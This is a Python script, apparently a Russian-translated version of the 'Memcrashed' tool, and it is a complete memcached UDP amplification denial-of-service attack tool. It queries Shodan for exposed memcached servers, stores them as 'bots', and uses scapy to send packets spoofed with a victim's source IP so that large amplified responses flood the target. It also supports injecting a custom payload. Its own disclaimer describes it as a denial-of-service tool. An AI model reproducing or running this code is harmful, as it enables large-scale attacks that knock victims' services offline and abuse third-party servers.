#-- coding: utf8 --
#!/usr/bin/env python3
import sys, os, time, shodan
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout

starttime = time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

class color:
    HEADER = '\033[0m'

keys = Path("./api.txt")
logo = color.HEADER + '''

   ███╗   ███╗███████╗███╗   ███╗ ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
   ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
   ██╔████╔██║█████╗  ██╔████╔██║██║     ██████╔╝███████║███████╗███████║█████╗  ██║  ██║
   ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██║  ██║
   ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██████╔╝
   ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ 

                                        Автор: @037
                                        Версия: 4.0
                                        Перевод: Ky43eRR8


################################################ДИСКЛЕЙМЕР##############################################
| Memcrashed - это инструмент, который позволяет использовать Shodan.io для получения сотен уязвимых   |
| серверов для memcached. Затем он позволяет использовать одни и те же серверы для запуска             |
| атаки типа «отказ в обслуживании» путем подделки UDP-пакетов, отправленных вашей жертве.             |
| Полезная нагрузка по умолчанию включает команду memcached "stats", 10 байтов для отправки, но в ответ|
| составляет от 1500 байтов до сотен килобайт. Пожалуйста, используйте этот инструмент ответственно.   |
| Я НЕ несу ответственности за любой ущерб, причиненный или совершенный с помощью этого инструмента.   |
| *Я лишь перевел данный скрипт. Ничего не вырезанно\перекодированно. Автор перевода не несёт          |
| ответственности за любой ущерб, причиненный или совершенный с помощью этого инструмента.             |
########################################################################################################
                                                                                      
'''
print(logo)

if keys.is_file():
    with open('api.txt', 'r') as file:
        SHODAN_API_KEY=file.readline().rstrip('\n')
else:
    file = open('api.txt', 'w')
    SHODAN_API_KEY = input('[*] Введите правильный API ключ сервиса Shodan.io:')
    file.write(SHODAN_API_KEY)
    print('[~] Файл записан: ./api.txt')
    file.close()

while True:
    api = shodan.Shodan(SHODAN_API_KEY)
    print('')
    try:
        myresults = Path("./bots.txt")
        query = input("[*] Использовать API Shodan для поиска затронутых серверов Memcached? <Y/n>: ").lower()
        if query.startswith('y'):
            print('')
            print('[~] Проверяем API ключ сервиса Shodan.io: %s' % SHODAN_API_KEY)
            results = api.search('product:"Memcached" port:11211')
            print('[✓] Проверка API ключа Shodan.io: Успешно!')
            print('[~] Номер бота: %s' % results['total'])
            print('')
            saveresult = input("[*] Сохранить список найденых ботов для дальнейшего использования? <Y/n>: ").lower()
            if saveresult.startswith('y'):
                file2 = open('bots.txt', 'a')
                for result in results['matches']:
                    file2.write(result['ip_str'] + "\n")
                print('[~] Файл записан: ./bots.txt')
                print('')
                file2.close()
        saveme = input('[*] Хотели бы вы использовать локально сохраненные данные Shodan? <Y/n>: ').lower()
        if myresults.is_file():
            if saveme.startswith('y'):
                with open('bots.txt') as my_file:
                    ip_array = [line.rstrip() for line in my_file]
        else:
            print('')
            print('[✘] Ошибка! Не удалось найти сохранёных ботов в файле bots.txt!')
            print('')
        if saveme.startswith('y') or query.startswith('y'):
            print('')
            target = input("[▸] Введите атакуемый IP:")
            targetport = input("[▸] Введите порт атакуемого (Обычно 80): ") or "80"
            power = int(input("[▸] Введите предпочтительную мощность (Обычно 1): ") or "1")
            print('')
            data = input("[+] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
            if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
                dataset = "set injected 0 3600 ", len(data)+1, "\r\n", data, "\r\n get injected\r\n"
                setdata = ("\x00\x00\x00\x00\x00\x00\x00\x00set\x00injected\x000\x003600\x00%s\r\n%s\r\n" % (len(data)+1, data))
                getdata = ("\x00\x00\x00\x00\x00\x00\x00\x00get\x00injected\r\n")
                print("[+] Payload transformed: ", dataset)
            print('')
            if query.startswith('y'):
                iplist = input('[*] Хотели бы вы видеть список ботов Shodan.io? <Y/n>: ').lower()
                if iplist.startswith('y'):
                    print('')
                    counter= int(0)
                    for result in results['matches']:
                        host = api.host('%s' % result['ip_str'])
                        counter=counter+1
                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, result['ip_str'], host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            if saveme.startswith('y'):
                iplistlocal = input('[*] Хотели бы отображать всех ботов, хранящихся локально? <Y/n>: ').lower()
                if iplistlocal.startswith('y'):
                    print('')
                    counter= int(0)
                    for x in ip_array:
                        host = api.host('%s' % x)
                        counter=counter+1
                        print('[+] Memcache Сервер (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, x, host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            print('')
            engage = input('[*] Начать атаковывать цель %s? <Y/n>: ' % target).lower()
            if engage.startswith('y'):
                if saveme.startswith('y'):
                    for i in ip_array:
                        if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
                            print('[+] Отправка 2 поддельных синхронизированных данных на %s' % (i))
                            with suppress_stdout():
                                send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=setdata), count=1)
                                send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=getdata), count=power)
                        else:
                            if power>1:
                                print('[+] Отправка %d поддельных пакетов UPD на: %s' % (power, i))
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                            elif power==1:
                                print('[+] Отправка 1 поддельного пакета UDP на: %s' % i)
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                else:
                    for result in results['matches']:
                        if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
                            print('[+] Отправка 2 поддельных синхронизированных данных на %s' % (i))
                            with suppress_stdout():
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=setdata), count=1)
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=getdata), count=power)
                        else:
                            if power>1:
                                print('[+] Отправка %d поддельных пакетов UPD на: %s' % (power, result['ip_str']))
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                            elif power==1:
                                print('[+] Отправка 1 поддельного пакета UDP на: %s' % result['ip_str'])
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                print('')
                print('[•] Задание выполнено! Удачи!')
                break
            else:
                print('')
                print('[✘] Ошибка: %s не задействован!' % target)
                print('[~] Перезагрузка скрипта, подождите...')
                print('')
        else:
            print('')
            print('[✘] Ошибка! Никаких ботов, хранящихся локально или удаленно на Shodan.io не было найденно!')
            print('[~] Перезагрузка скрипта, подождите...')
            print('')

    except shodan.APIError as e:
            print('[✘] Ошибка: %s' % e)
            option = input('[*] Хотели бы вы сменить API ключ сервиса Shodan.io? <Y/n>: ').lower()
            if option.startswith('y'):
                file = open('api.txt', 'w')
                SHODAN_API_KEY = input('[*] Пожалуйста, введите правильный API ключ Shodan.io: ')
                file.write(SHODAN_API_KEY)
                print('[~] Файл записан: ./api.txt')
                file.close()
                print('[~] Перезагрузка скрипта, подождите...')
                print('')
            else:
                print('')
                print('[•] Завершение скрипта. Удачи!')
                break
